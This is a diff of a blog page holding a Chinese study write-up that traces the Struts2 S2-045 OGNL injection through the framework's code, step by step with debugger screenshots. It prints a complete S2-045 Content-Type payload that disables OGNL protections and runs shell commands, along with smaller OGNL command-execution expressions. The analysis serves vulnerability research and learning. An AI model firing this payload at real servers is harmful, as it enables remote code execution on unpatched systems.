@@ -6,15 +6,37 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives | WisdomTree&#39;s Blog</title>
+  <title>s2-045 调试分析 | WisdomTree&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="WisdomTree&#39;s Blog">
-<meta property="og:url" content="http://yoursite.com/archives/index.html">
+  <meta name="description" content="最近刚放假，身边好多小伙伴都没放，刚好有时间搞搞技术。想来我过完年也要面对找工作的难题，看看我目前居然还没有分析过struct2的漏洞，心里发慌。赶紧趁着这两天分析分析，顺便学习ognl表达式。就以当年很火的s2-045为例。在调试分析的时候参照了很多师傅的分析文章，但是在我看来大部分都不够细致，便自己写一篇文章作为学习笔记。  ognl表达式基础1、ognl作用  （1）支持对象方法的调用，如">
+<meta property="og:type" content="article">
+<meta property="og:title" content="s2-045 调试分析">
+<meta property="og:url" content="http://yoursite.com/2019/01/11/s2-045-调试分析/index.html">
 <meta property="og:site_name" content="WisdomTree&#39;s Blog">
+<meta property="og:description" content="最近刚放假，身边好多小伙伴都没放，刚好有时间搞搞技术。想来我过完年也要面对找工作的难题，看看我目前居然还没有分析过struct2的漏洞，心里发慌。赶紧趁着这两天分析分析，顺便学习ognl表达式。就以当年很火的s2-045为例。在调试分析的时候参照了很多师傅的分析文章，但是在我看来大部分都不够细致，便自己写一篇文章作为学习笔记。  ognl表达式基础1、ognl作用  （1）支持对象方法的调用，如">
 <meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/2019/01/11/s2-045-调试分析/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/01/11/s2-045-调试分析/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/01/11/s2-045-调试分析/3.png">
+<meta property="og:image" content="http://yoursite.com/2019/01/11/s2-045-调试分析/4.png">
+<meta property="og:image" content="http://yoursite.com/2019/01/11/s2-045-调试分析/5.png">
+<meta property="og:image" content="http://yoursite.com/2019/01/11/s2-045-调试分析/6.png">
+<meta property="og:image" content="http://yoursite.com/2019/01/11/s2-045-调试分析/7.png">
+<meta property="og:image" content="http://yoursite.com/2019/01/11/s2-045-调试分析/8.png">
+<meta property="og:image" content="http://yoursite.com/2019/01/11/s2-045-调试分析/9.png">
+<meta property="og:image" content="http://yoursite.com/2019/01/11/s2-045-调试分析/10.png">
+<meta property="og:image" content="http://yoursite.com/2019/01/11/s2-045-调试分析/11.png">
+<meta property="og:image" content="http://yoursite.com/2019/01/11/s2-045-调试分析/12.png">
+<meta property="og:image" content="http://yoursite.com/2019/01/11/s2-045-调试分析/13.png">
+<meta property="og:image" content="http://yoursite.com/2019/01/11/s2-045-调试分析/14.png">
+<meta property="og:image" content="http://yoursite.com/2019/01/11/s2-045-调试分析/15.png">
+<meta property="og:image" content="https://struts.apache.org/maven/struts2-core/apidocs/com/opensymphony/xwork2/util/TextParseUtil.ParsedValueEvaluator.html">
+<meta property="og:image" content="http://yoursite.com/2019/01/11/s2-045-调试分析/10.png">
+<meta property="og:updated_time" content="2019-01-11T08:24:42.649Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="WisdomTree&#39;s Blog">
+<meta name="twitter:title" content="s2-045 调试分析">
+<meta name="twitter:description" content="最近刚放假，身边好多小伙伴都没放，刚好有时间搞搞技术。想来我过完年也要面对找工作的难题，看看我目前居然还没有分析过struct2的漏洞，心里发慌。赶紧趁着这两天分析分析，顺便学习ognl表达式。就以当年很火的s2-045为例。在调试分析的时候参照了很多师傅的分析文章，但是在我看来大部分都不够细致，便自己写一篇文章作为学习笔记。  ognl表达式基础1、ognl作用  （1）支持对象方法的调用，如">
+<meta name="twitter:image" content="http://yoursite.com/2019/01/11/s2-045-调试分析/1.png">
   
     <link rel="alternative" href="/atom.xml" title="WisdomTree&#39;s Blog" type="application/atom+xml">
   
@@ -150,37 +172,102 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-s2-045-调试分析" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      s2-045 调试分析
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/01/11/s2-045-调试分析/" class="archive-article-date">
+
+        
+        <a href="/2019/01/11/s2-045-调试分析/" class="archive-article-date">
   	<time datetime="2019-01-11T05:41:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-11</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/01/11/s2-045-调试分析/">s2-045 调试分析</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>最近刚放假，身边好多小伙伴都没放，刚好有时间搞搞技术。想来我过完年也要面对找工作的难题，看看我目前居然还没有分析过struct2的漏洞，心里发慌。赶紧趁着这两天分析分析，顺便学习ognl表达式。就以当年很火的s2-045为例。在调试分析的时候参照了很多师傅的分析文章，但是在我看来大部分都不够细致，便自己写一篇文章作为学习笔记。</p>
+</blockquote>
+<h3 id="ognl表达式基础"><a href="#ognl表达式基础" class="headerlink" title="ognl表达式基础"></a>ognl表达式基础</h3><p>1、ognl作用<br>  （1）支持对象方法的调用，如：<code>(#cmd={&#39;/bin/bash&#39;,&#39;-c&#39;,&#39;whoami&#39;})(#p=new java.lang.ProcessBuilder(#cmd))</code>。<br>  （2）支持类的静态方法的调用和静态属性的访问，如：<code>@java.lang.Runtime@getRuntime().exec(&#39;whoami&#39;)</code>。<br>  （3）支持赋值操作和表达式串联。这使得我们可以利用ognl表达式“编写”一段程序。  </p>
+<p>2、ognl三大要素<br>  （1）上下文（Context对象）<br>在ognl表达式中不可避免的要使用上下文环境这一概念。网上各种官方的解释很多，我在这里就以我的理解来阐述。所谓的上下文环境，我的理解就是一个用于解析并且执行ognl表达式的环境。所有的ognl表达式都需要在上下文环境中才能解析执行。<br>  （2）表达式<br>表达式是ognl的灵魂。所有的取值，赋值，以及我们所构造的payload都是以ognl表达式的形式呈现。这里也简单记录ognl的语法。在ognl中有三个符号经常使用，分别是#,%和$。#符号主要用途有三：访问非根对象（<code>#user.id</code>），用于过滤和投影（<code>books.{?#this.price&gt;35}</code>）以及构造Map（<code>#{&#39;foo1&#39;:&#39;bar1&#39;, &#39;foo2&#39;:&#39;bar2&#39;}</code>）。%符号是用于在标签属性中表明<code>%{}</code>内部的字符串被当作ognl来解析。$符号有两个用途：在国际化资源文件中，引用OGNL表达式、在Struts 2配置文件中，引用OGNL表达式。<br>  （3）根对象<br>根对象可以理解为ognl所面向的对象。ognl表达式对根对象进行操作。以任意一个对象为根，通过OGNL可以访问与这个对象关联的其它对象。</p>
+<p>3、小结<br>如果把context对象看作是一个执行环境，那么表达式就是我们的逻辑代码，根对象和非根对象就是我们的变量。这里还有一点需要提一下，只有访问非根对象时才需要使用<code>#</code>。访问根对象不用井号。ognl表达式的解析依赖于<code>Ognl.parseExpression</code>方法，ognl表达式经过解析之后返回一个对象，接下来调用<code>Ognl.getValue</code>方法执行表达式的内容。<code>Ognl.getValue</code>方法使用语法：<code>Ognl.getValue(object,content,root_object)</code>。</p>
+<p>说了这么多，最主要的还是如何使用ognl实现命令执行。我参照网上现有的payload自己也写了一个:<code>(#a=@java.lang.Runtime@getRuntime().exec(&#39;whoami&#39;)).(#b=#a.getInputStream()).(#c=new java.io.InputStreamReader(#b)).(#d=new java.io.BufferedReader(#c)).(#e=#d.readLine())</code></p>
+<p>这条paylaod并不完善，没有做回显也没有做bypass，仅供自己学习使用。</p>
+<h3 id="s2-045漏洞简介"><a href="#s2-045漏洞简介" class="headerlink" title="s2-045漏洞简介"></a>s2-045漏洞简介</h3><p>struct2原本的设计初衷是在处理报头为<code>Content-Type:multipart/form-data</code>调用Jakarta解析器。初衷没有错，可是在我看来整个漏洞环节最致命之处就在于获取<code>Content-Type</code>的值这一步。居然使用的是<code>contains</code>方法。。。。。换句话说只要<code>Content-Type</code>的值中存在<code>multipart/form-data</code>字符串都将调用Jakarta解析器进行处理。这才导致后面引入ognl表达式。</p>
+<h3 id="s2-045调试分析"><a href="#s2-045调试分析" class="headerlink" title="s2-045调试分析"></a>s2-045调试分析</h3><p>struct2版本：struct2.3.28<br>使用的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#_=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos;whoami&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure>
+<p>我们从拦截器<code>org/apache/struts2/dispatcher/Dispatcher.class</code>开始跟踪，我们在<code>wrapRequest</code>方法中下断点。</p>
+<p><img src="/2019/01/11/s2-045-调试分析/1.png" alt=""></p>
+<p>第一个框处，我们只要在<code>Content-Type</code>中传入<code>multipart/form-data</code>字符串即可满足。第二个框表明struct2默认调用jakarta解析器解析<code>Content-Type:multipart/form-data</code>数据包。我们跟入<code>MultiPartRequestWrapper</code>。</p>
+<p><img src="/2019/01/11/s2-045-调试分析/2.png" alt=""></p>
+<p>继续跟入<code>this.multi.parse</code>方法：</p>
+<p><img src="/2019/01/11/s2-045-调试分析/3.png" alt=""></p>
+<p>在<code>parse</code>方法中<code>this.processUpload</code>方法触发异常，在下面捕获到该异常。并且将异常信息传入<code>this.buildErrorMessage</code>方法。捕获的异常信息如下:</p>
+<p><img src="/2019/01/11/s2-045-调试分析/4.png" alt=""></p>
+<p>可以看到主要描述就是<code>Content-Type</code>异常，但是最恐怖的地方就在于，这里直接获取<code>Content-Type</code>中的所有内容。如果是在做污点分析的话，这妥妥的就是一个污点呀。我们继续往下走，跟入<code>this.buildErrorMessage</code>方法。</p>
+<p><img src="/2019/01/11/s2-045-调试分析/5.png" alt=""></p>
+<p>这里的<code>e.getMessage()</code>就是获取我们上一张图的报错信息，其中就有构造的payload。跟进<code>LocalizedTextUtil.findText</code>方法。</p>
+<p><img src="/2019/01/11/s2-045-调试分析/6.png" alt=""></p>
+<p>这里继续将<code>defaultMessage</code>传入<code>findText</code>方法中继续跟入：</p>
+<p><img src="/2019/01/11/s2-045-调试分析/7.png" alt=""></p>
+<p>跟进<code>getDefaultMessage</code>方法：</p>
+<p><img src="/2019/01/11/s2-045-调试分析/8.png" alt=""></p>
+<p>这里将我们的<code>defaultMessage</code>赋值给<code>message</code>继续将<code>message</code>传入<code>TextParseUtil.translateVariables</code>。</p>
+<p><img src="/2019/01/11/s2-045-调试分析/9.png" alt=""></p>
+<p>连续步入三个方法就能进入真正的<code>translateVariables</code>方法。看到这个方法的名字就容易让人兴奋<code>parser.evaluate</code>。看名字就知道不是什么正经方法，肯定能解析某些东西。并且我们的<code>expression</code>还传入其中。继续跟进。</p>
+<p><img src="/2019/01/11/s2-045-调试分析/10.png" alt=""></p>
+<p><code>parser.evaluate</code>方法前面半段代码的作用主要是取出<code>%{}</code>或<code>${}</code>的内容，将其作为ognl表达式传入<code>evaluator.evaluate</code>方法。</p>
+<p><img src="/2019/01/11/s2-045-调试分析/11.png" alt=""></p>
+<p>这里是让我困扰了很久。我一开始一直以为是在<code>evaluator.evaluate</code>方法中解析ognl表达式。而且网上很多分析也就到此为止了。并没有说具体在哪一个方法中解析。后来在调试的过程中发现，其实是在<code>stack.findValue</code>方法中解析ognl表达式。我们跟入<code>stack.findValue</code>方法。连续步入两次就能看到以下方法。</p>
+<p><img src="/2019/01/11/s2-045-调试分析/12.png" alt=""></p>
+<p>继续跟入<code>tryFindValueWhenExpressionIsNotNull</code>。</p>
+<p><img src="/2019/01/11/s2-045-调试分析/13.png" alt=""></p>
+<p>哦！看到<code>getValue</code>方法了！很兴奋，继续跟！</p>
+<p><img src="/2019/01/11/s2-045-调试分析/14.png" alt=""></p>
+<p>继续往下走：</p>
+<p><img src="/2019/01/11/s2-045-调试分析/15.png" alt=""></p>
+<p>finally！！！看到了<code>Ognl.getValue</code>，并且我们构造的payload传入其中。成功解析ognl表达式。</p>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>实际上也未必要像我这样从头跟到尾。我是跟踪到最后ognl表达式如何被解析。有的师傅在分析过程中也提到了：translateVariables()方法继承接口com.opensymphony.xwork2.util.TextParseUtil.ParsedValueEvaluator<br>在创建对象后重写了evaluate()方法，通过该方法的说明文档可知evaluate()方法会解析ognl表达式。</p>
+<p><img src="https://struts.apache.org/maven/struts2-core/apidocs/com/opensymphony/xwork2/util/TextParseUtil.ParsedValueEvaluator.html" alt="官方文档"></p>
+<p>也就是说只要走到<code>parser.evaluate</code>方法中的<code>evaluator.evaluate</code>方法，这里的参数可控就能确定有一个ognl表达式注入漏洞了！</p>
+<p><img src="/2019/01/11/s2-045-调试分析/10.png" alt=""></p>
 
-        <div class="article-info info-on-right">
-          
-          
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
 		<ul class="article-tag-list">
@@ -193,275 +280,104 @@
 	</div>
 
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
       
-        </div></section>
+
       
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/01/11/s2-045-调试分析/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/12/31/Bye-2018/" class="archive-article-date">
-  	<time datetime="2018-12-31T02:26:40.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-31</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/12/31/Bye-2018/">Bye 2018</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/12/28/laravel路由解析分析/" class="archive-article-date">
-  	<time datetime="2018-12-28T08:34:05.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-28</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2018/12/31/Bye-2018/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Bye 2018</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/12/28/laravel路由解析分析/">laravel路由解析分析</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/学习笔记//" class="article-tag-list-link color5">学习笔记</a>
-        		</li>
-      		
-		</ul>
-	</div>
+        
+        
+    </div>
+</aside>
 
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/09/11/js原型链污染/" class="archive-article-date">
-  	<time datetime="2018-09-11T12:13:09.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-11</time>
-</a>
-        </div>
-    	 
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/09/11/js原型链污染/">js原型链污染</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/学习笔记//" class="article-tag-list-link color5">学习笔记</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/04/22/Discuz-x-portal-Stored-XSS-CVE-2018-10298/" class="archive-article-date">
-  	<time datetime="2018-04-22T15:34:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-22</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/04/22/Discuz-x-portal-Stored-XSS-CVE-2018-10298/">Discuz_x_portal_Stored_XSS(CVE-2018-10298)</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/04/04/Summary-of-PHP-code-audit-experience/" class="archive-article-date">
-  	<time datetime="2018-04-04T15:23:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-04</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/04/04/Summary-of-PHP-code-audit-experience/">Summary of PHP code audit experience</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/03/30/CVE-2018-9134-Dedecms-background-file-rename/" class="archive-article-date">
-  	<time datetime="2018-03-30T15:18:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-30</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/03/30/CVE-2018-9134-Dedecms-background-file-rename/">CVE-2018-9134-Dedecms-background-file-rename</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/03/07/CVE-2018-7700-dedecms后台任意代码执行/" class="archive-article-date">
-  	<time datetime="2018-03-07T13:24:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-07</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/03/07/CVE-2018-7700-dedecms后台任意代码执行/">CVE-2018-7700 dedecms后台任意代码执行</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-      
-        </div></section>
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2017" class="archive-year">2017</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/12/31/2017-END/" class="archive-article-date">
-  	<time datetime="2017-12-30T16:35:10.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-12-31</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/12/31/2017-END/">2017 END</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
 
 
           </div>
@@ -484,8 +400,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
